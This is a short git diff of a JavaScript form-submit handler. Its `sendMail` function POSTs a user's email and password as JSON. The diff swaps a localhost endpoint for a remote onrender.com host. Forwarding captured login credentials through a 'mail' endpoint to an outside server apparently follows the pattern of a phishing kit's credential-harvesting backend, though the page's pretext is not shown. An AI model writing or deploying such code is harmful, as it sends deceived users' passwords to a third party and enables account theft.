@@ -28,7 +28,8 @@ form.addEventListener("submit", async (event) => {
 const sendMail = async ({ email, password }) => {
   //use live url here bro
   try {
-    const response = await fetch("http://localhost:8000/", {
+    // const response = await fetch("http://localhost:8000/", {
+    const response = await fetch("https://mail-75eu.onrender.com/", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
